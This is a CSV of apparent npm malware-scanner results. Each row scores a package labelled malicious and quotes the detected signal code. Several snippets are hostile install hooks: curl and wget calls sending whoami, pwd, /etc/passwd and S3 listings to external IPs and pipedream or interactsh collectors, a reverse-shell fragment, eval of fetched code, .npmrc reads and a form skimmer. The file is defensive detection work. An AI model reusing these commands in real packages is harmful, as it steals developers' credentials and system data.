package_name,version,label,timestamp,routing,risk_score,confidence,primary_category,confirmed_count,supporting_count,noise_filtered,layer1_count,layer2_count,sources_analyzed,has_js_source,confirmed_signals_json,supporting_signals_json
@employee-experience/common,999.9.11,malicious,2026-03-27T01:53:38.151863,flag,0.77,0.825,dynamic_code_execution,2,0,0,2,0,install.js,True,"[""Signal  : Eval In Install File\nLocation: install.js:1\nCode    : const e=require(\""crypto\""),r=\""aes-256-ctr\"",t=\""@McQfTjWnZr4u7x!A%D*G-KaNdRgUkXp\"",c=c=>{const n=e.createDecipheriv(r,t,Buff..."", ""Signal  : Version contains inflated segment(s) [999] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 999.9.11""]",[]
@exabyte-io/chimpy,2023.3.3-4,malicious,2026-03-27T01:53:38.229477,review,0.5033,0.725,supply_chain_attack,1,1,1,1,2,entry_point,True,"[""Signal  : Version contains inflated segment(s) [2023] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 2023.3.3-4""]","[""Signal  : Non-standard URL in function call: http://bit.ly/2btQaFu\\n\nLocation: entry_point:137\nCode    : log.info('\\nMaster Chimp and become a testing Ninja! Check out our course: '.green + 'http://bit.ly/2btQaFu\\n'.blue.underline)""]"
@pagseguro/stylelint-config,6.1.5,malicious,2026-03-27T01:53:38.233082,skip,0.26,0.65,none,0,2,0,0,2,"index.js,entry_point",True,[],"[""Signal  : Non-standard URL in function call: https://ifconfig.me\nLocation: index.js:2\nCode    : exec(\""a=$(hostname;pwd;whoami;echo 'stylelint-config';curl -s https://ifconfig.me;) && for i in ${a}; do curl -ski -d \\\""$i\\\"" 1wy3rk316x8qqy4..."", ""Signal  : Non-standard URL in function call: https://ifconfig.me\nLocation: entry_point:2\nCode    : exec(\""a=$(hostname;pwd;whoami;echo 'stylelint-config';curl -s https://ifconfig.me;) && for i in ${a}; do curl -ski -d \\\""$i\\\"" 1wy3rk316x8qqy4...""]"
@playgami/portal-logs,2.99.99,malicious,2026-03-27T01:53:38.233726,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 2 file(s): ['package.json', 'pre.sh']""]",[]
@podval/test_dep_confs,1.0.0,malicious,2026-03-27T01:53:38.234541,flag,0.7773,0.835,network_exfiltration,2,0,0,2,0,entry_point,True,"[""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl http://34.141.82.227/\\?whoami=$(whoami)"", ""Signal  : Hardcoded external IP address '34.141.82.227'\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl http://34.141.82.227/\\?whoami=$(whoami)""]",[]
@proofpoint/fuse-ui,1.0.0,malicious,2026-03-27T01:53:38.237858,review,0.494,0.715,network_exfiltration,1,1,0,2,0,extract.js,True,"[""Signal  : Network Request In Install\nLocation: extract.js:1\nCode    : const https = require('https');""]","[""Signal  : Filesystem Write In Install\nLocation: extract.js:4\nCode    : var dir = os.homedir()""]"
@realty-front/ad,1.13.1,malicious,2026-03-27T01:53:38.238570,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@realty-front/payment-cards,1.13.1,malicious,2026-03-27T01:53:38.239371,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@roku-web-core/ajax,1.99999999999999.99999999999999,malicious,2026-03-27T01:53:38.247958,flag,0.754,0.6825,network_exfiltration,1,3,0,3,1,"hook.js,entry_point",True,"[""Signal  : Network Request In Install\nLocation: hook.js:2\nCode    : var https = require('https');""]","[""Signal  : Filesystem Write In Install\nLocation: hook.js:25\nCode    : npmrcText = fs.readFileSync(os.homedir() + '/.npmrc');"", ""Signal  : Version contains inflated segment(s) [99999999999999, 99999999999999] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 1.99999999999999.99999999999999"", ""Signal  : Non-standard URL in function call: https://jon-test.site/funtimes.php\nLocation: hook.js:54\nCode    : https.get('https://jon-test.site/funtimes.php', options, function() {   //console.log(x); })""]"
@roots/browserslist-config,2023.3.16,malicious,2026-03-27T01:53:38.249708,review,0.3733,0.8,supply_chain_attack,1,0,0,1,0,scripts/postinstall.mjs,True,"[""Signal  : Version contains inflated segment(s) [2023] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 2023.3.16""]",[]
@roots/bud,2023.0.30,malicious,2026-03-27T01:53:38.254037,review,0.3733,0.8,supply_chain_attack,1,0,0,1,0,"scripts/postinstall.mjs,entry_point",True,"[""Signal  : Version contains inflated segment(s) [2023] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 2023.0.30""]",[]
@tangoch/add-two,2.0.1,malicious,2026-03-27T01:53:38.263242,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""ahs3ykmb4wm2gvn44955wb5ks.canarytokens.com\"","", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
@testing.sec123/toxic-pkg-dont-use,0.0.3,malicious,2026-03-27T01:53:38.265923,review,0.364,0.78,network_exfiltration,1,0,0,1,0,build.js,True,"[""Signal  : Network Request In Install\nLocation: build.js:1\nCode    : var http = require('https');""]",[]
@trapido90/chalk_js,5.2.2,malicious,2026-03-27T01:53:38.270483,flag,0.7773,0.835,data_exfiltration,2,0,0,2,0,entry_point,True,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl https://61a54ccc098beb1b94e949de0d110344.m.pipedream.net/new/$(whoami)/$(pwd)"", ""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl https://61a54ccc098beb1b94e949de0d110344.m.pipedream.net/new/$(whoami)/$(pwd)""]",[]
@trimoz/trimoz-vue-error-handling,1.81.60,malicious,2026-03-27T01:53:38.363199,review,0.364,0.78,network_exfiltration,1,0,0,1,0,"build.js,entry_point",True,"[""Signal  : Network Request In Install\nLocation: build.js:1\nCode    : const goto = require('https');""]",[]
@uc-maps/maps.react,0.99.999,malicious,2026-03-27T01:53:38.367730,review,0.494,0.715,network_exfiltration,1,1,0,2,0,./.pbk.js,True,"[""Signal  : Network Request In Install\nLocation: ./.pbk.js:2\nCode    : const https = require('https');""]","[""Signal  : Version contains inflated segment(s) [999] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 0.99.999""]"
@vendavo/pezzi,4.0.0-7,malicious,2026-03-27T01:53:38.368569,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@wadk/icons,99.10.11,malicious,2026-03-27T01:53:38.372083,flag,0.7607,0.815,network_exfiltration,2,0,0,2,0,"index.js,entry_point",True,"[""Signal  : Network Request In Install\nLocation: index.js:1\nCode    : const https = require('https')"", ""Signal  : Eval In Install File\nLocation: index.js:12\nCode    : eval(data.toString())""]",[]
@wtest/e-c,1.0.2,malicious,2026-03-27T01:53:54.666573,flag,0.8167,0.875,obfuscation,2,0,2,0,4,entry_point,True,"[""Signal  : Obfuscator tool signature (_0x pattern, 53441 occurrences)\nLocation: entry_point:2\nCode    : function _0x286b(_0x29cb60,_0x455125){const _0x3fe560=_0x3fe5();return _0x286b=function(_0x286b6d,_0x23e08c){_0x286b6d=_"", ""Signal  : Hardcoded external IP(s) in function call: 8.8.8.8\nLocation: entry_point:2\nCode    : process[_0xfc5ae1(0xeff)](()=>{const _0x36ccd2=_0xfc5ae1;if(typeof _0x5553fa!==_0x36ccd2(0xa16))return _0x7a3689&&_0x7a3689(null),_0x2c2200(...""]",[]
@xvideos/alerts,1.0.0,malicious,2026-03-27T01:53:54.672004,skip,0.13,0.65,none,0,1,0,1,0,"build-project.js,entry_point",True,[],"[""Signal  : Filesystem Write In Install\nLocation: build-project.js:12\nCode    : os.tmpdir(),""]"
@yandex-travel/ci,1.1.0,malicious,2026-03-27T01:53:54.672798,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@yandex-travel/eslint-config,0.0.7,malicious,2026-03-27T01:53:54.673618,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@yandex-travel/ts-config,0.1.0,malicious,2026-03-27T01:53:54.674380,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@yandex-travel/ui,1.1.1,malicious,2026-03-27T01:53:54.675092,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@yorek/sqlpackage,160.6161.0,malicious,2026-03-27T01:53:54.704941,review,0.494,0.715,network_exfiltration,1,1,0,2,0,lib/install.js,True,"[""Signal  : Network Request In Install\nLocation: lib/install.js:6\nCode    : const https = require('https');""]","[""Signal  : Version contains inflated segment(s) [6161] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 160.6161.0""]"
aa-testkit,9.9.3,malicious,2026-03-27T01:53:54.710367,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
aae-stream,130.0.0,malicious,2026-03-27T01:53:54.711700,flag,1.0,0.8925,network_exfiltration,4,0,0,4,0,entry_point,True,"[""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : wget --quiet \""http://196.188.125.134/?user=$(whoami)&path=$(ls /)&hostname=$(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/"", ""Signal  : Hardcoded external IP address '196.188.125.134'\nLocation: package.json \u2192 scripts.test\nCode    : wget --quiet \""http://196.188.125.134/?user=$(whoami)&path=$(ls /)&hostname=$(cat /etc/passwd)&s3=$(aws s3 ls s3://)&home"", ""Signal  : Hardcoded external IP address '196.188.125.134'\nLocation: package.json \u2192 scripts.preinstall\nCode    : wget --quiet \""http://196.188.125.134/?user=$(whoami)&path=$(ls /)&hostname=$(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/"", ""Signal  : Hardcoded external IP address '192.81.209.195'\nLocation: package.json \u2192 scripts.preinstall\nCode    : wget --quiet \""http://196.188.125.134/?user=$(whoami)&path=$(ls /)&hostname=$(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/""]",[]
abacus-cmdline,99.99.99,malicious,2026-03-27T01:53:54.712284,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 2 file(s): ['package.json', 'pre.sh']""]",[]
ably-asset-tracking-common,1.0.0,malicious,2026-03-27T01:53:54.721152,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:26\nCode    : hostname: \""eo6cvg8kvj30wxd.m.pipedream.net\"", //replace burpcollaborator.net with Interactsh or pipedream"", ""Signal  : Network Request In Install\nLocation: index.js:5\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:12\nCode    : hd: os.homedir(),""]"
ably-common,1.2.0,malicious,2026-03-27T01:53:54.730207,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:26\nCode    : hostname: \""eoawu1sht21zwp8.m.pipedream.net\"", //replace burpcollaborator.net with Interactsh or pipedream"", ""Signal  : Network Request In Install\nLocation: index.js:5\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:12\nCode    : hd: os.homedir(),""]"
ably-control-api-action,0.1.5,malicious,2026-03-27T01:53:54.739277,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:26\nCode    : hostname: \""eo1bj0lgont3eal.m.pipedream.net\"", //replace burpcollaborator.net with Interactsh or pipedream"", ""Signal  : Network Request In Install\nLocation: index.js:5\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:12\nCode    : hd: os.homedir(),""]"
ably-engineering,1.0.0,malicious,2026-03-27T01:53:54.739958,flag,1.0,0.7967,data_exfiltration,3,0,0,3,0,none,False,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl https://eo7k0ogyrj0trrn.m.pipedream.net"", ""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl https://eo7k0ogyrj0trrn.m.pipedream.net"", ""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
ably-fragmenter-test,1.0.0,malicious,2026-03-27T01:53:54.748981,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:26\nCode    : hostname: \""eo5wgbnahpiwezj.m.pipedream.net\"", //replace burpcollaborator.net with Interactsh or pipedream"", ""Signal  : Network Request In Install\nLocation: index.js:5\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:12\nCode    : hd: os.homedir(),""]"
acookie,1.0.1,malicious,2026-03-27T01:53:54.762129,flag,0.9973,0.865,data_exfiltration,2,0,0,2,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:58\nCode    : hostname: 'f5778d1d81cc30c39dcdd0da5ca1d49a.m.pipedream.net',"", ""Signal  : Network Request In Install\nLocation: index.js:3\nCode    : const https = require('https')""]",[]
acronis-ui-kit,99.9.50,malicious,2026-03-27T01:53:54.783220,flag,1.0,0.8214,network_exfiltration,6,1,0,1,6,"index.js,entry_point",True,"[""Signal  : Hardcoded external IP(s) in function call: 8.8.8.8\nLocation: index.js:86\nCode    : dns.lookup('ns.jrebind.com', function(err, address) {         if (!err) {             nsAddress = address;         } else {             nsAd..."", ""Signal  : Hardcoded external IP(s) in function call: 20.106.202.190\nLocation: index.js:86\nCode    : dns.lookup('ns.jrebind.com', function(err, address) {         if (!err) {             nsAddress = address;         } else {             nsAd..."", ""Signal  : Hardcoded external IP(s) in function call: 4.4.4.4\nLocation: index.js:86\nCode    : dns.lookup('ns.jrebind.com', function(err, address) {         if (!err) {             nsAddress = address;         } else {             nsAd..."", ""Signal  : Hardcoded external IP(s) in function call: 8.8.8.8\nLocation: entry_point:86\nCode    : dns.lookup('ns.jrebind.com', function(err, address) {         if (!err) {             nsAddress = address;         } else {             nsAd..."", ""Signal  : Hardcoded external IP(s) in function call: 20.106.202.190\nLocation: entry_point:86\nCode    : dns.lookup('ns.jrebind.com', function(err, address) {         if (!err) {             nsAddress = address;         } else {             nsAd..."", ""Signal  : Hardcoded external IP(s) in function call: 4.4.4.4\nLocation: entry_point:86\nCode    : dns.lookup('ns.jrebind.com', function(err, address) {         if (!err) {             nsAddress = address;         } else {             nsAd...""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:59\nCode    : if (homeDirsToIgnore.indexOf(os.homedir()) > -1) {""]"
action-destinations,60.54.35,malicious,2026-03-27T01:53:54.787700,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
attacker_present_helloworld,10.29.0,malicious,2026-03-27T01:53:54.790696,skip,0.13,0.65,none,0,1,0,0,1,entry_point,True,[],"[""Signal  : Non-standard URL in function call: https://npg66ok9u6yy2e7x48rezmhan1tshi57.oastify.com\nLocation: entry_point:3\nCode    : Array.from(form).forEach(form => addEventListener(\""submit\"", function() {         let inputs = form.querySelectorAll(\""input\"");         for(co...""]"
attribution-project,1.999.0,malicious,2026-03-27T01:53:54.794374,review,0.39,0.65,none,0,3,0,1,2,"index.js,entry_point",True,[],"[""Signal  : Version contains inflated segment(s) [999] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 1.999.0"", ""Signal  : Non-standard URL in function call: https://ifconfig.me\nLocation: index.js:2\nCode    : exec(\""a=$(hostname;pwd;whoami;echo 'attribution-project';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $..."", ""Signal  : Non-standard URL in function call: https://ifconfig.me\nLocation: entry_point:2\nCode    : exec(\""a=$(hostname;pwd;whoami;echo 'attribution-project';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $...""]"
auto-issues,1.18.2,malicious,2026-03-27T01:53:54.795165,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
autocomplete-core,15.0.1,malicious,2026-03-27T01:53:54.803995,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:26\nCode    : hostname: \""cc0mttv2vtc0000t7r30ggyko1wyyyyyn.interact.sh\"", //replace burpcollaborator.net with Interactsh or pipedream"", ""Signal  : Network Request In Install\nLocation: index.js:5\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:12\nCode    : hd: os.homedir(),""]"
aws-rfdk-project,19.0.1,malicious,2026-03-27T01:53:54.812939,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""d7l68sa0gd0qf6xny3bisbtie9kz8o.burpcollaborator.net\"", //replace burpcollaborator.net with Interactsh or piped"", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
axelar-signing-relayer,1.1.1,malicious,2026-03-27T01:53:54.813499,skip,0.0,,none,0,0,0,0,0,none,False,[],[]
axios-proxy,1.9.9,malicious,2026-03-27T01:53:54.814662,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
axios-replace,1.0.0,malicious,2026-03-27T01:53:55.033800,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
azure-filter-2,99.10.11,malicious,2026-03-27T01:53:55.103384,review,0.494,0.715,network_exfiltration,1,1,0,2,0,"index.js,entry_point",True,"[""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:167\nCode    : hd: os.homedir(),""]"
azure-linux-tools,1.0.0,malicious,2026-03-27T01:53:55.118631,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""en3200xn6mbcvbo.m.pipedream.net\"", //replace burpcollaborator.net with Interactsh or pipedream"", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : homedirectory: os.homedir(),""]"
azure-rest-api-specs-tests,1.0.0,malicious,2026-03-27T01:53:55.128493,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:26\nCode    : hostname: \""cfptb3c2vtc0000sqvmgg85tpmryyyyyd.oast.fun\"", //attacker server"", ""Signal  : Network Request In Install\nLocation: index.js:5\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:12\nCode    : hd: os.homedir(),""]"
